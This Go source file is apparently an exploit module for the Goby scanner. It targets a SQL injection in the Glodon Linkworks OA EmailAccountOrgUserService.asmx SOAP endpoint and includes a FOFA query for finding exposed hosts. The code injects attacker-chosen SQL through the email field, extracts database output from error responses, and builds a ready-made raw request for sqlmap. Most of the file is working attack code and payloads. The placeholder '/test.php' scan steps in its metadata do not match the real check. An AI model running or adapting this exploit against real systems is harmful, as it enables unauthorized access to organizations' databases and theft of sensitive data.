package exploits

import (
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Glodon Linkworks OA /Mail/Services/EmailAccountOrgUserService.asmx email SQL Injection Vulnerability",
    "Description": "<p>Glodon OA is a software that provides comprehensive office solutions for enterprises. It integrates multiple functions, including document management, process approval, task assignment, and more, aiming to improve productivity and collaboration within the enterprise. At the same time, Glodon OA also focuses on security and protects the security of enterprise data and information through a variety of measures. With Glodon OA, enterprises can handle daily office tasks more efficiently and conveniently, and improve overall operational efficiency. </p><p>Glodon Linkworks office OA EmailAccountOrgUserService. Asmx interface have SQL injection vulnerabilities, after sending request packet, can obtain sensitive information in a database.</p>",
    "Product": "Glodon OA",
    "Homepage": "https://www.glodon.com/index.html",
    "DisclosureDate": "2024-01-16",
    "PostTime": "2024-07-30",
    "Author": "1215816861@qq.com",
    "FofaQuery": "body=\"JS/loginStyle.js\" && body=\"/ClientFiles/\" || body=\"Login/custom/css/Login.css\"",
    "GobyQuery": "body=\"JS/loginStyle.js\" && body=\"/ClientFiles/\" || body=\"Login/custom/css/Login.css\"",
    "Level": "2",
    "Impact": "<p>Glodon Linkworks office OA EmailAccountOrgUserService. Asmx interface have SQL injection vulnerabilities, after sending request packet, can obtain sensitive information in a database.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer'shomepage update:<a href=\"https://www.glodon.com/index.html\">https://www.glodon.com/index.html</a></p><p>2. Deploy a web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlpoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "3515 IN (CHAR(99)+CHAR(97)+CHAR(110)+CHAR(99)+CHAR(97)+CHAR(110)+CHAR(110)+CHAR(101)+CHAR(101)+CHAR(100))",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "广联达OA /Mail/Services/EmailAccountOrgUserService.asmx email参数 SQL 注入漏洞",
            "Product": "广联达OA",
            "Description": "<p>广联达OA是一款为企业提供综合办公解决方案的软件。它集成了多种功能，包括文档管理、流程审批、任务分配等，旨在提高企业内部的工作效率和协作能力。同时，广联达OA还注重安全性，通过多种措施保护企业数据和信息的安全。使用广联达OA，企业可以更加高效、便捷地处理日常办公任务，提升整体运营效率。&nbsp;<br></p><p>广联达 Linkworks办公OA&nbsp;EmailAccountOrgUserService.asmx接口存在SQL注入漏洞，发送请求包后可以获取数据库中的敏感信息。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://www.glodon.com/index.html\">https://www.glodon.com/index.html</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>&nbsp;3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>广联达 Linkworks办公OA&nbsp;EmailAccountOrgUserService.asmx接口存在SQL注入漏洞，发送请求包后可以获取数据库中的敏感信息。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Glodon Linkworks OA /Mail/Services/EmailAccountOrgUserService.asmx email SQL Injection Vulnerability",
            "Product": "Glodon OA",
            "Description": "<p>Glodon OA is a software that provides comprehensive office solutions for enterprises. It integrates multiple functions, including document management, process approval, task assignment, and more, aiming to improve productivity and collaboration within the enterprise. At the same time, Glodon OA also focuses on security and protects the security of enterprise data and information through a variety of measures. With Glodon OA, enterprises can handle daily office tasks more efficiently and conveniently, and improve overall operational efficiency.&nbsp;</p><p>Glodon Linkworks office OA EmailAccountOrgUserService. Asmx interface have SQL injection vulnerabilities, after sending request packet, can obtain sensitive information in a database.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer'shomepage update:<a href=\"https://www.glodon.com/index.html\">https://www.glodon.com/index.html</a></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Glodon Linkworks office OA EmailAccountOrgUserService. Asmx interface have SQL injection vulnerabilities, after sending request packet, can obtain sensitive information in a database.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10984"
}`

	setSqlPayloadHash_g9s6d8dsPLJHD202 := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.Timeout = 15
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			PostRequest.Data = data
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		urlget := `/Mail/Services/EmailAccountOrgUserService.asmx`
		data := `<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
    <GetUserInfosByEmail xmlns="http://tempuri.org/">
    <email>') AND ` + sql + ` AND ('ShLa'='ShLa</email>
    </GetUserInfosByEmail>
    </soap:Body>
    </soap:Envelope>`
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Content-Type":    "text/xml",
		}
		resp, err = setPostRequest(hostInfo, urlget, data, header)
		if err != nil || resp.StatusCode != 500 {
			return resp, "", err
		}

		//配置漏洞存在的路径
		vulurl = "/Mail/Services/EmailAccountOrgUserService.asmx"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "cancanneed"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `3515 IN (CHAR(99)+CHAR(97)+CHAR(110)+CHAR(99)+CHAR(97)+CHAR(110)+CHAR(110)+CHAR(101)+CHAR(101)+CHAR(100))`

			sendPayload := setSqlPayloadHash_g9s6d8dsPLJHD202

			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil || !strings.Contains(resp.RawBody, content) {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			// 1.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /Mail/Services/EmailAccountOrgUserService.asmx HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25\nContent-Length: 497\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\nAccept-Language: zh-CN,zh;q=0.9\nContent-Type: text/xml\nAccept-Encoding: gzip, deflate\nConnection: close\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n<soap:Body>\n<GetUserInfosByEmail xmlns=\"http://tempuri.org/\">\n<email>') AND 3515 IN (CHAR(99)+CHAR(97)+CHAR(110)+CHAR(99)+CHAR(97)+CHAR(110)+CHAR(110)+CHAR(101)+CHAR(101)+CHAR(100)) AND ('ShLa'='ShLa</email>\n</GetUserInfosByEmail>\n</soap:Body>\n</soap:Envelope>"

			// 2.配置正则语句，从响应包中提取出数据
			regular := ` '([\s\S]*?)' `

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHash_g9s6d8dsPLJHD202
			attacktype := goutils.B2S(ss.Params["attackType"])
			switch attacktype {

			case "sql":
				sql := goutils.B2S(ss.Params["sql"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed` + err.Error()
					expResult.Success = false
					return expResult
				}

				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "Exploitation failed "
					return expResult
				}
				expResult.Success = true
				expResult.Output = output

			case "sqlpoint":
				expResult.Success = true
				expResult.Output = sqlpoint

			default:
				expResult.Success = false
				expResult.Output = "Unknown attack type"

			}
			return expResult
		},
	))
}
